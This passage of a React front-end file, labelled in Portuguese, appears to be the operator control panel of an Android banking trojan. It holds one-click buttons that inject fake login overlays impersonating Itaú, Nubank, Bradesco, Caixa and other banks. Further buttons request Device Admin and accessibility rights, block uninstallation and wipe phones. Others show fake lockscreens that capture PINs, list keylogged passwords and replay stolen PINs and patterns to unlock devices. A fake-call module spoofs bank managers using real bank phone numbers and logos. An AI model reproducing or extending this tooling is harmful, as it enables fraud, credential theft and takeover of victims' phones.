                    </button>

                    <button
                      onClick={() => {
                        setEditingTemplate(null);
                        setShowBlackScreenEditor(true);
                      }}
                      className="w-full py-2.5 px-3 rounded-xl bg-red-600 hover:bg-red-500 text-white font-bold text-xs uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(37,99,235,0.5)] border border-red-400/50"
                    >
                      <Sliders className="w-4 h-4" />
                      ðŸŽ¨ Editor Completo de Injects
                    </button>
                  </div>

                  {/* Lista de Templates RÃ¡pidos Prontos */}
                  <div className="space-y-1.5 pt-2 border-t border-[#14233e]">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">
                      âš¡ Injetar Template RÃ¡pido:
                    </span>
                    <div className="space-y-1.5 max-h-[340px] overflow-y-auto pr-1">
                      {[
                        { name: 'âœ¨ Google Play - Carregando', id: 'pre-google-progress' },
                        { name: 'âœ¨ Google Play - Digital', id: 'pre-google-fingerprint' },
                        { name: 'âœ¨ Google Play - Rosto', id: 'pre-google-facial' },
                        { name: 'ðŸ”¥ ItaÃº - Senha de Acesso', id: 'pre-itau-senha' },
                        { name: 'ðŸ”¥ Bradesco - ValidaÃ§Ã£o Chave', id: 'pre-bradesco-token' },
                        { name: 'ðŸ”¥ Nubank - AutorizaÃ§Ã£o 6 DÃ­gitos', id: 'pre-nubank-6digit' },
                        { name: 'ðŸ”¥ Nubank - Senha 4 DÃ­gitos', id: 'pre-nubank-senha' },
                        { name: 'ðŸ”¥ Banco Inter - iSafe & Senha', id: 'pre-inter-isafe' },
                        { name: 'ðŸ”¥ C6 Bank - Digite a Senha', id: 'pre-c6-senha' },
                        { name: 'ðŸ”¥ Caixa Tem - ValidaÃ§Ã£o', id: 'pre-caixa-senha' },
                        { name: 'ðŸ”¥ Banco do Brasil - Acesso', id: 'pre-bb-senha' },
                        { name: 'ðŸ”¥ Santander - CartÃ£o & Senha', id: 'pre-santander-id' },
                        { name: 'ðŸ”¥ BTG Pactual - Token & Senha', id: 'pre-btg-senha' },
                        { name: 'ðŸ”¥ Sicredi / Sicoob - Senha', id: 'pre-sicredi-senha' },
                        { name: 'ðŸ”¥ Banrisul - ConfirmaÃ§Ã£o', id: 'pre-banrisul-senha' }
                      ].map((tpl) => (
                        <div
                          key={tpl.id}
                          className="w-full p-1.5 px-2 rounded-lg bg-[#091224] hover:bg-[#0e1c36] border border-[#14233e] hover:border-red-500/50 text-[11px] font-bold text-slate-200 transition-all flex items-center justify-between gap-1 group"
                        >
                          <span className="truncate max-w-[130px] text-[10.5px]" title={tpl.name}>{tpl.name}</span>
                          <div className="flex items-center gap-1 shrink-0">
                            <button
                              onClick={() => {
                                const foundTpl = PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === tpl.id);
                                setEditingTemplate(foundTpl || { id: tpl.id, name: tpl.name, backgroundColor: '#000000', elements: [] });
                                setShowBlackScreenEditor(true);
                              }}
                              className="text-[9px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 hover:bg-amber-500 hover:text-black border border-amber-500/40 font-black transition-all flex items-center gap-0.5"
                              title="Editar este template no editor visual"
                            >
                              âœï¸ EDITAR
                            </button>
                            <button
                              onClick={() => handlePrepareInject(tpl)}
                              className="text-[9px] px-1.5 py-0.5 rounded bg-red-950 text-pink-300 border border-red-800/60 font-black hover:bg-red-600 hover:text-white transition-all"
                              title="Injetar diretamente no dispositivo"
                            >
                              INJETAR âš¡
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {/* ======================================================== */}
              {/* Aba 5: Central de Admin, Lock, PIN & SeguranÃ§a           */}
              {/* ======================================================== */}
              {sidePanelTab === 'admin_security' && (
                <div className="space-y-3 pt-0.5 font-mono">
                  {/* CabeÃ§alho com Gradiente */}
                  <div className="bg-gradient-to-r from-amber-500/10 via-rose-500/10 to-red-500/10 border border-amber-500/30 rounded-xl p-2.5 flex items-center justify-between shadow-[0_0_15px_rgba(245,158,11,0.15)]">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shrink-0">
                        <ShieldCheck className="w-4 h-4" />
                      </div>
                      <div>
                        <span className="text-[11px] font-black text-amber-300 uppercase tracking-wide block flex items-center gap-1">
                          âš¡ FUNÃ‡Ã•ES DO APARELHO & ADMIN
                        </span>
                        <span className="text-[8.5px] text-slate-400 uppercase tracking-wider block">
                          Pedir Admin, Remover App, Wipe, Acessibilidade & Lock
                        </span>
                      </div>
                    </div>
                    <span className="text-[9px] px-2 py-0.5 rounded-full bg-rose-500/20 text-emerald-300 border border-emerald-500/30 font-bold animate-pulse">
                      AO VIVO
                    </span>
                  </div>

                  {/* Scroll Container */}
                  <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                    {/* ---------------------------------------------------- */}
                    {/* ðŸ‘‘ SEÃ‡ÃƒO 1: PRIVILÃ‰GIOS DE ADMIN & PERMISSÃ•ES       */}
                    {/* ---------------------------------------------------- */}
                    <div className="bg-[#091224] border border-[#14233e] rounded-xl p-2.5 space-y-2">
                      <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                        <span className="text-[10px] font-black text-amber-300 uppercase flex items-center gap-1.5">
                          <ShieldAlert className="w-3.5 h-3.5 text-amber-400" />
                          1. PrivilÃ©gios & Device Admin
                        </span>
                        <button
                          onClick={handleCheckAdminStatus}
                          className="text-[9px] text-red-400 hover:text-pink-300 flex items-center gap-0.5 uppercase"
                          title="Verificar se Administrador estÃ¡ ativo"
                        >
                          <RefreshCw className="w-2.5 h-2.5" /> Checar
                        </button>
                      </div>

                      {/* BotÃ£o Principal: PEDIR DEVICE ADMIN */}
                      <button
                        onClick={handleRequestAdmin}
                        className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-amber-600 via-rose-600 to-red-600 hover:from-amber-500 hover:to-rose-500 text-white font-black text-xs uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(244,63,94,0.4)] border border-amber-400/50 group"
                      >
                        <ShieldCheck className="w-4 h-4 group-hover:scale-110 transition-transform" />
                        ðŸ›¡ï¸ SOLICITAR DEVICE ADMIN
                      </button>

                      {/* Grid de PermissÃµes CrÃ­ticas do Sistema */}
                      <div className="grid grid-cols-2 gap-1.5 pt-0.5">
                        <button
                          onClick={handleRequestAccessibility}
                          className="p-1.5 rounded-lg bg-[#0c1830] hover:bg-[#102244] border border-[#182d52] hover:border-red-500/50 text-slate-200 text-[9.5px] font-bold uppercase transition-all flex items-center gap-1.5 justify-center"
                          title="Abre a tela de Acessibilidade no dispositivo alvo"
                        >
                          <Zap className="w-3 h-3 text-red-400" />
                          Acessibilidade
                        </button>

                        <button
                          onClick={handleRequestBatteryOptimization}
                          className="p-1.5 rounded-lg bg-[#0c1830] hover:bg-[#102244] border border-[#182d52] hover:border-emerald-500/50 text-slate-200 text-[9.5px] font-bold uppercase transition-all flex items-center gap-1.5 justify-center"
                          title="Solicita que o app ignore economia de bateria (24/7)"
                        >
                          <Battery className="w-3 h-3 text-emerald-400" />
                          Ignorar Bateria
                        </button>

                        <button
                          onClick={handleRequestOverlay}
                          className="p-1.5 rounded-lg bg-[#0c1830] hover:bg-[#102244] border border-[#182d52] hover:border-red-500/50 text-slate-200 text-[9.5px] font-bold uppercase transition-all flex items-center gap-1.5 justify-center"
                          title="PermissÃ£o para desenhar sobre outros apps"
                        >
                          <Layers className="w-3 h-3 text-red-400" />
                          SobreposiÃ§Ã£o
                        </button>

                        <button
                          onClick={() => {
                            sendCommand({ action: 'TOGGLE_BOT_OPTION', option: 'anti_delete', value: true });
                            showToast('ProteÃ§Ã£o Anti-DesinstalaÃ§Ã£o ativada!', 'success');
                          }}
                          className="p-1.5 rounded-lg bg-[#0c1830] hover:bg-[#102244] border border-[#182d52] hover:border-amber-500/50 text-slate-200 text-[9.5px] font-bold uppercase transition-all flex items-center gap-1.5 justify-center"
                          title="Impede que o usuÃ¡rio desinstale o app"
                        >
                          <Lock className="w-3 h-3 text-amber-400" />
                          Anti-RemoÃ§Ã£o
                        </button>
                      </div>

                      {/* BotÃµes de AÃ§Ã£o AvanÃ§ada: Remover App Remoto & Wipe */}
                      <div className="pt-1 space-y-1">
                        <button
                          onClick={() => setShowSelfDestructModal(true)}
                          className="w-full py-1.5 px-2 rounded-lg bg-rose-950/50 hover:bg-rose-900/80 text-rose-200 hover:text-white border border-rose-600/60 text-[9.5px] font-black uppercase transition-all flex items-center justify-center gap-1.5 shadow-[0_0_10px_rgba(244,63,94,0.3)] active:scale-95"
                          title="Auto-destruiÃ§Ã£o: Desinstala e remove permanentemente este app do celular remoto"
                        >
                          <Trash2 className="w-3 h-3 text-rose-400" />
                          ðŸ—‘ï¸ REMOVER ESTE APP (SELF-DESTRUCT)
                        </button>

                        <button
                          onClick={() => setShowWipeConfirm(true)}
                          className="w-full py-1.5 px-2 rounded-lg bg-red-950/40 hover:bg-red-900/60 text-red-300 hover:text-white border border-red-800/50 text-[9.5px] font-bold uppercase transition-all flex items-center justify-center gap-1.5"
                        >
                          <Trash2 className="w-3 h-3 text-red-400" />
                          âš ï¸ Formatar Dispositivo Remoto (Wipe)
                        </button>
                      </div>
                    </div>

                    {/* ---------------------------------------------------- */}
                    {/* ðŸ”’ SEÃ‡ÃƒO 2: LOCK, DESBLOQUEIO & TELAS FALSAS        */}
                    {/* ---------------------------------------------------- */}
                    <div className="bg-[#091224] border border-[#14233e] rounded-xl p-2.5 space-y-2">
                      <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                        <span className="text-[10px] font-black text-pink-300 uppercase flex items-center gap-1.5">
                          <Lock className="w-3.5 h-3.5 text-red-400" />
                          2. Bloqueio & Telas de Lock
                        </span>
                        <span className="text-[9px] text-slate-400 font-mono">Controle Direto</span>
                      </div>

                      {/* BotÃ£o de Ligar/Acender Tela */}
                      <button
                        onClick={handleWakeUpScreen}
                        className="w-full py-2 px-3 rounded-lg bg-gradient-to-r from-red-950 via-[#0a274c] to-red-950 hover:from-red-900 hover:to-red-900 border border-red-400/60 text-pink-200 text-[11px] font-black uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(6,182,212,0.3)]"
                        title="Acender/Ligar a tela do dispositivo imediatamente"
                      >
                        <Zap className="w-4 h-4 text-pink-300 animate-pulse shrink-0" />
                        <span>ðŸ’¡ LIGAR TELA (ACENDER DISPLAY)</span>
                      </button>

                      {/* Bloquear e Desbloquear */}
                      <div className="grid grid-cols-2 gap-1.5">
                        <button
                          onClick={handleLockDevice}
                          className="py-2 px-2.5 rounded-lg bg-amber-950/40 hover:bg-amber-900/60 border border-amber-600/50 hover:border-amber-400 text-amber-200 text-[10.5px] font-black uppercase transition-all flex items-center justify-center gap-1.5 shadow-[0_0_10px_rgba(245,158,11,0.2)]"
                        >
                          <Lock className="w-3.5 h-3.5 text-amber-400" />
                          Bloquear Tela
                        </button>

                        <button
                          onClick={handleUnlockDevice}
                          className="py-2 px-2.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 border border-emerald-600/50 hover:border-emerald-400 text-emerald-200 text-[10.5px] font-black uppercase transition-all flex items-center justify-center gap-1.5 shadow-[0_0_10px_rgba(16,185,129,0.2)]"
                        >
                          <Unlock className="w-3.5 h-3.5 text-emerald-400" />
                          Desbloquear
                        </button>
                      </div>

                      {/* Modo Oculto / Black Screen RÃ¡pido */}
                      <button
                        onClick={() => handleToggleBlackScreen(!isBlackScreen)}
                        className={`w-full py-1.5 px-2 rounded-lg border text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1.5 ${
                          isBlackScreen
                            ? 'bg-red-500 text-black border-pink-300 shadow-[0_0_12px_rgba(6,182,212,0.5)]'
                            : 'bg-[#0a1426] border-[#162744] text-pink-300 hover:text-white'
                        }`}
                      >
                        <EyeOff className="w-3.5 h-3.5" />
                        {isBlackScreen ? 'ðŸ‘ï¸ Desativar Modo Oculto' : 'ðŸ•¶ï¸ Ativar Modo Oculto (Tela Preta)'}
                      </button>

                      {/* Overlay Fake Lockscreen */}
                      <div className="bg-[#060c18] border border-[#101b2f] rounded-lg p-2 space-y-1.5">
                        <span className="text-[9.5px] font-bold text-slate-400 uppercase tracking-wider block">
                          ðŸŽ­ Overlay de Lockscreen Falsa (Captura PIN):
                        </span>
                        <div className="grid grid-cols-3 gap-1">
                          {(['pin', 'pattern', 'password'] as const).map((t) => (
                            <button
                              key={t}
                              onClick={() => setFakeLockType(t)}
                              className={`py-1 text-center rounded text-[9px] font-bold uppercase transition-all ${
                                fakeLockType === t
                                  ? 'bg-[#0070f3] text-white shadow-[0_0_8px_rgba(0,112,243,0.4)]'
                                  : 'bg-[#0a1426] text-slate-400 hover:text-slate-200 border border-[#14233e]'
                              }`}
                            >
                              {t === 'pin' ? 'PIN 4-6D' : t === 'pattern' ? 'PadrÃ£o 3x3' : 'Senha'}
                            </button>
                          ))}
                        </div>

                        <div className="grid grid-cols-2 gap-1.5 pt-0.5">
                          <button
                            onClick={() => handleShowLockscreenOverlay(fakeLockType)}
                            className="py-1.5 px-2 rounded-lg bg-red-600 hover:bg-red-500 text-white font-bold text-[9.5px] uppercase transition-all flex items-center justify-center gap-1 shadow-md"
                          >
                            <Play className="w-2.5 h-2.5" /> Exibir Lock
                          </button>
                          <button
                            onClick={handleHideLockscreenOverlay}
                            className="py-1.5 px-2 rounded-lg bg-[#0e1c36] hover:bg-[#14284d] text-slate-300 font-bold text-[9.5px] uppercase transition-all flex items-center justify-center gap-1 border border-[#182d52]"
                          >
                            <X className="w-2.5 h-2.5" /> Ocultar Lock
                          </button>
                        </div>
                      </div>

                      {/* Bloqueio de Abertura de Apps */}
                      <div className="space-y-1 pt-1 border-t border-[#14233e]">
                        <span className="text-[9.5px] font-bold text-slate-400 uppercase tracking-wider block">
                          ðŸš« Bloqueio de Abertura (Tela IndisponÃ­vel):
                        </span>
                        <div className="grid grid-cols-2 gap-1.5">
                          <button
                            onClick={handleBlockAllBanks}
                            className="py-1 px-1.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 border border-rose-800/40 text-rose-300 text-[9px] font-bold uppercase transition-all text-center"
                          >
                            ðŸš« Travar Bancos
                          </button>
                          <button
                            onClick={handleBlockAllSocial}
                            className="py-1 px-1.5 rounded-lg bg-red-950/40 hover:bg-red-900/60 border border-red-800/40 text-pink-300 text-[9px] font-bold uppercase transition-all text-center"
                          >
                            ðŸš« Travar Redes
                          </button>
                        </div>
                        <button
                          onClick={handleUnblockAllApps}
                          className="w-full py-1 rounded-lg bg-[#0a1426] hover:bg-[#0e1c36] border border-[#14233e] text-slate-300 text-[8.5px] font-bold uppercase transition-all text-center"
                        >
                          âœ… Liberar Todos os Apps
                        </button>
                      </div>
                    </div>

                    {/* ---------------------------------------------------- */}
                    {/* ðŸ”¢ SEÃ‡ÃƒO 3: INJEÃ‡ÃƒO DE PIN & TECLADO VIRTUAL        */}
                    {/* ---------------------------------------------------- */}
                    <div className="bg-[#091224] border border-[#14233e] rounded-xl p-2.5 space-y-2">
                      <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                        <span className="text-[10px] font-black text-emerald-300 uppercase flex items-center gap-1.5">
                          <Hash className="w-3.5 h-3.5 text-emerald-400" />
                          3. InjeÃ§Ã£o de PIN & Keypad
                        </span>
                        <span className="text-[9px] text-red-400 font-mono font-bold">Auto Unlock</span>
                      </div>

                      {/* Input do PIN e Delay */}
                      <div className="space-y-1.5">
                        <div className="flex gap-1.5">
                          <div className="flex-1 relative">
                            <input
                              type="text"
                              placeholder="Digite o PIN (ex: 1234)..."
                              value={pinInput}
                              onChange={(e) => setPinInput(e.target.value)}
                              className="w-full bg-[#0a1426] border border-[#152442] focus:border-emerald-500 rounded-lg px-2.5 py-1.5 text-xs text-white placeholder-slate-500 outline-none font-mono tracking-widest font-black"
                            />
                            {pinInput && (
                              <button
                                onClick={() => setPinInput('')}
                                className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-[10px]"
                              >
                                âœ•
                              </button>
                            )}
                          </div>

                          <select
                            value={pinDelay}
                            onChange={(e) => setPinDelay(Number(e.target.value))}
                            className="bg-[#0a1426] border border-[#152442] text-pink-300 rounded-lg px-2 py-1.5 text-[10px] outline-none font-mono font-bold"
                            title="Intervalo entre toques no aparelho"
                          >
                            <option value={300}>300ms (Turbo)</option>
                            <option value={500}>500ms (RÃ¡pido)</option>
                            <option value={800}>800ms (Normal)</option>
                            <option value={1200}>1.2s (Seguro)</option>
                          </select>
                        </div>

                        {/* BotÃ£o de Disparo do PIN */}
                        <button
                          onClick={() => handlePlayPinSequence()}
                          className="w-full py-2 px-3 rounded-xl bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white font-black text-xs uppercase transition-all flex items-center justify-center gap-1.5 shadow-[0_0_15px_rgba(16,185,129,0.3)] border border-emerald-400/40"
                        >
                          <Play className="w-3.5 h-3.5 fill-white" />
                          ðŸš€ REPRODUZIR PIN NO APARELHO
                        </button>
                      </div>

                      {/* Mini Teclado Virtual NumÃ©rico (0-9) para Lockscreen */}
                      <div className="bg-[#060c18] border border-[#101b2f] rounded-xl p-2 space-y-1.5">
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider">
                            ðŸ”¢ Keypad InstantÃ¢neo (Toque Direto):
                          </span>
                          <span className="text-[8px] text-red-400">Lock Key Press</span>
                        </div>

                        <div className="grid grid-cols-3 gap-1.5">
                          {['1', '2', '3', '4', '5', '6', '7', '8', '9'].map((digit) => (
                            <button
                              key={digit}
                              onClick={() => handleLockKeyPress(digit)}
                              className="py-2 rounded-lg bg-[#0b162b] hover:bg-rose-600 hover:text-white border border-[#162744] hover:border-emerald-400 text-slate-100 font-black text-xs transition-all active:scale-95 shadow-sm"
                            >
                              {digit}
                            </button>
                          ))}
                          <button
                            onClick={() => {
                              sendCommand({ action: 'LOCK_KEY_PRESS', key: 'del' });
                              setPinInput((prev) => prev.slice(0, -1));
                              showToast('Backspace enviado', 'info');
                            }}
                            className="py-2 rounded-lg bg-rose-950/40 hover:bg-rose-600 hover:text-white border border-rose-900/40 text-rose-300 font-bold text-[10px] uppercase transition-all active:scale-95"
                            title="Apagar Ãºltimo caractere"
                          >
                            âŒ« Apagar
                          </button>
                          <button
                            onClick={() => handleLockKeyPress('0')}
                            className="py-2 rounded-lg bg-[#0b162b] hover:bg-rose-600 hover:text-white border border-[#162744] hover:border-emerald-400 text-slate-100 font-black text-xs transition-all active:scale-95"
                          >
                            0
                          </button>
                          <button
                            onClick={() => {
                              sendCommand({ action: 'LOCK_KEY_PRESS', key: 'enter' });
                              showToast('Enter/OK enviado', 'info');
                            }}
                            className="py-2 rounded-lg bg-red-950/60 hover:bg-red-600 hover:text-white border border-red-800/60 text-pink-300 font-bold text-[10px] uppercase transition-all active:scale-95"
                            title="Confirmar / Enter"
                          >
                            âŽ OK
                          </button>
                        </div>
                      </div>

                      {/* InjeÃ§Ã£o de PadrÃ£o (Pattern Lock) */}
                      <div className="bg-[#060c18] border border-[#101b2f] rounded-xl p-2 space-y-1.5">
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
                          ðŸ”² InjeÃ§Ã£o de PadrÃ£o (Pattern 3x3):
                        </span>
                        <div className="flex gap-1.5">
                          <input
                            type="text"
                            placeholder="SequÃªncia (ex: 12369, 14789)..."
                            value={patternInput}
                            onChange={(e) => setPatternInput(e.target.value)}
                            className="flex-1 bg-[#0a1426] border border-[#152442] focus:border-red-500 rounded-lg px-2 py-1 text-xs text-white placeholder-slate-500 outline-none font-mono"
                          />
                          <button
                            onClick={() => handlePlayPattern()}
                            className="px-2.5 py-1 rounded-lg bg-red-600 hover:bg-red-500 text-white font-bold text-[9.5px] uppercase transition-all shrink-0"
                          >
                            Desenhar
                          </button>
                        </div>
                        <div className="text-[8px] text-slate-500 flex justify-between">
                          <span>Grade 3x3: 1=Sup.Esq | 5=Centro | 9=Inf.Dir</span>
                          <span className="text-red-400 cursor-pointer" onClick={() => setPatternInput('14789')}>
                            Ex: L (14789)
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* ---------------------------------------------------- */}
                    {/* ðŸ”‘ SEÃ‡ÃƒO 4: SENHAS & PINS EXTRAÃDOS (KEYLOGGER)     */}
                    {/* ---------------------------------------------------- */}
                    <div className="bg-[#091224] border border-[#14233e] rounded-xl p-2.5 space-y-2">
                      <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                        <span className="text-[10px] font-black text-amber-300 uppercase flex items-center gap-1.5">
                          <Key className="w-3.5 h-3.5 text-amber-400" />
                          4. PINs & PadrÃµes Capturados ({detectedPinsAndPasswords.length})
                        </span>
                        <span className="text-[8.5px] text-slate-500">Auto Captura</span>
                      </div>

                      {detectedPinsAndPasswords.length === 0 ? (
                        <div className="text-center py-4 text-slate-500 text-[10px]">
                          Nenhum PIN ou padrÃ£o de bloqueio detectado recentemente.
                        </div>
                      ) : (
                        <div className="space-y-1.5">
                          {detectedPinsAndPasswords.map((item, idx) => (
                            <div
                              key={idx}
                              className={`p-1.5 px-2 bg-[#060c18] border ${
                                item.isPattern ? 'border-red-500/40 hover:border-red-400' : 'border-[#14233e] hover:border-amber-500/40'
                              } rounded-lg flex items-center justify-between gap-1.5 transition-all group`}
                            >
                              <div className="truncate max-w-[150px]">
                                <div className="flex items-center gap-1.5">
                                  <span className="text-[10px] font-bold text-amber-300 truncate">
                                    {item.app}
                                  </span>
                                  {item.isPattern ? (
                                    <span className="text-[7.5px] px-1 py-0.2 rounded bg-red-500/20 text-pink-300 border border-red-500/30 font-bold shrink-0">
                                      PADRÃƒO
                                    </span>
                                  ) : item.isPin ? (
                                    <span className="text-[7.5px] px-1 py-0.2 rounded bg-rose-500/20 text-emerald-300 border border-emerald-500/30 font-bold shrink-0">
                                      PIN
                                    </span>
                                  ) : (
                                    <span className="text-[7.5px] px-1 py-0.2 rounded bg-red-500/20 text-pink-300 border border-red-500/30 font-bold shrink-0">
                                      SENHA
                                    </span>
                                  )}
                                  <span className="text-[8px] text-slate-500">{item.time}</span>
                                </div>
                                <div className="text-[11px] font-black text-white font-mono tracking-wider flex items-center gap-1">
                                  {item.isPattern ? 'ðŸ”² ' : 'ðŸ”¢ '}
                                  {item.text}
                                </div>
                              </div>

                              <div className="flex items-center gap-1 shrink-0">
                                <button
                                  onClick={() => {
                                    if (item.isPattern) {
                                      setPatternInput(item.text);
                                      showToast(`PadrÃ£o [${item.text}] carregado no campo!`, 'info');
                                    } else {
                                      setPinInput(item.text);
                                      showToast(`PIN [${item.text}] carregado no campo!`, 'info');
                                    }
                                  }}
                                  className="text-[8.5px] px-1.5 py-0.5 rounded bg-[#0e1c36] hover:bg-[#14284d] text-slate-300 border border-[#182d52] font-bold uppercase transition-all"
                                  title="Carregar no campo"
                                >
                                  Usar
                                </button>
                                <button
                                  onClick={() => {
                                    if (item.isPattern) {
                                      handlePlayPattern(item.text);
                                    } else {
                                      handlePlayPinSequence(item.text);
                                    }
                                  }}
                                  className="text-[8.5px] px-2 py-0.5 rounded bg-gradient-to-r from-rose-600 to-red-600 text-white font-black uppercase hover:opacity-90 transition-all shadow-sm flex items-center gap-0.5"
                                  title="Injetar diretamente no celular"
                                >
                                  <Zap className="w-2.5 h-2.5" /> Injetar
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Aba: FAKE CALL (FORJAR LIGAÃ‡Ã•ES E VOZ 2-WAY) */}
              {sidePanelTab === 'fake_call' && (
                <div className="space-y-3 pt-0.5 font-mono">
                  {/* CabeÃ§alho Fake Call */}
                  <div className="bg-gradient-to-r from-red-950/50 via-blue-950/50 to-red-950/50 border border-red-500/30 rounded-xl p-2.5 flex items-center justify-between shadow-[0_0_15px_rgba(6,182,212,0.15)]">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-red-500/20 border border-red-500/40 flex items-center justify-center text-pink-300 shrink-0">
                        <PhoneIncoming className="w-4 h-4 animate-bounce" />
                      </div>
                      <div>
                        <span className="text-[11px] font-black text-pink-200 uppercase tracking-wide block flex items-center gap-1">
                          ðŸ“ž FORJAR CHAMADA (FAKE CALL)
                        </span>
                        <span className="text-[8.5px] text-slate-400 uppercase tracking-wider block">
                          Simular LigaÃ§Ã£o Entrante + Ãudio 2-Way
                        </span>
                      </div>
                    </div>
                    <button
                      onClick={() => setShowVoiceCallModal(true)}
                      className="text-[9px] px-2 py-0.5 rounded-full bg-red-500/20 text-pink-300 border border-red-500/30 font-bold hover:bg-red-500/40 transition-all cursor-pointer"
                      title="Expandir em Janela Modal"
                    >
                      <span>â›¶ Expandir</span>
                    </button>
                  </div>

                  {/* Presets RÃ¡pidos */}
                  <div className="space-y-1.5 bg-[#091224] border border-[#14233e] rounded-xl p-2.5">
                    <span className="text-[10px] font-bold text-pink-300 uppercase tracking-wider block">
                      âš¡ Atalhos RÃ¡pidos de Identidade:
                    </span>
                    <div className="grid grid-cols-2 gap-1.5">
                      {[
                        { label: 'ðŸ¦ ItaÃº Uniclass', name: 'Gerente ItaÃº Uniclass', title: 'ITAÃš UNICLASS â€¢ ATENDIMENTO', number: '0800 728 0728', bank: 'itau' },
                        { label: 'ðŸŸ£ Nubank Seg.', name: 'Central de SeguranÃ§a Nubank', title: 'NUBANK â€¢ ATENDIMENTO VIP', number: '0800 591 2117', bank: 'nubank' },
                        { label: 'ðŸ”´ Bradesco VIP', name: 'Bradesco GerÃªncia de Conta', title: 'BRADESCO â€¢ CENTRAL SUPORTE', number: '0800 704 8383', bank: 'bradesco' },
                        { label: 'ðŸ”· Caixa EconÃ´mica', name: 'Atendimento Caixa EconÃ´mica', title: 'CAIXA ECONÃ”MICA â€¢ SUPORTE', number: '0800 726 0101', bank: 'caixa' },
                      ].map((preset) => (
                        <button
                          key={preset.label}
                          type="button"
                          onClick={() => {
                            setSideFakeCallerName(preset.name);
                            setSideFakeCallTitle(preset.title);
                            setSideFakeCallerNumber(preset.number);
                            setSideFakeBank(preset.bank);
                          }}
                          className="py-1.5 px-2 rounded-lg bg-[#0c1830] hover:bg-red-950/40 border border-[#182d52] hover:border-red-400 text-slate-200 text-left font-mono text-[10px] transition-all flex items-center justify-between cursor-pointer"
                        >
                          <span className="truncate">{preset.label}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* FormulÃ¡rio de ConfiguraÃ§Ã£o do Gerente & Chamada */}
                  <div className="bg-[#091224] border border-red-500/40 rounded-xl p-3 space-y-2.5 shadow-md font-mono">
                    <div className="flex items-center justify-between border-b border-red-500/20 pb-1.5">
                      <span className="text-[10px] font-bold text-pink-300 uppercase tracking-wider flex items-center gap-1.5">
                        <UserCheck className="w-3.5 h-3.5 text-red-400" />
                        âœï¸ EDITAR NOME DO GERENTE / TÃTULO DA CHAMADA:
                      </span>
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸ·ï¸ TÃ­tulo do Topo da Chamada (Header):
                      </label>
                      <input
                        type="text"
                        value={sideFakeCallTitle}
                        onChange={(e) => setSideFakeCallTitle(e.target.value)}
                        placeholder="Ex: ItaÃº Suporte, ItaÃº Uniclass â€¢ Atendimento..."
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸ‘¤ Nome do Gerente / TÃ­tulo do Chamador:
                      </label>
                      <input
                        type="text"
                        value={sideFakeCallerName}
                        onChange={(e) => setSideFakeCallerName(e.target.value)}
                        placeholder="Ex: Gerente ItaÃº Uniclass, Gerente de Conta..."
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸ–¼ï¸ Foto / Logo de Perfil (URL da Imagem - Opcional):
                      </label>
                      <input
                        type="text"
                        value={sideFakePhotoUrl}
                        onChange={(e) => setSideFakePhotoUrl(e.target.value)}
                        placeholder="Ex: https://... (Deixe em branco para usar as iniciais)"
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />

                      {/* Atalhos RÃ¡pidos de Fotos */}
                      <div className="grid grid-cols-3 gap-1 pt-1">
                        <button
                          type="button"
                          onClick={() => setSideFakePhotoUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Itau_logo.svg/512px-Itau_logo.svg.png')}
                          className="py-1 px-1.5 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[9px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸŸ  Logo ItaÃº
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideFakePhotoUrl('https://images.unsplash.com/photo-1560250097-0b93528c311a?w=400&auto=format&fit=crop')}
                          className="py-1 px-1.5 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[9px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸ‘¨ Gerente Homem
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideFakePhotoUrl('https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=400&auto=format&fit=crop')}
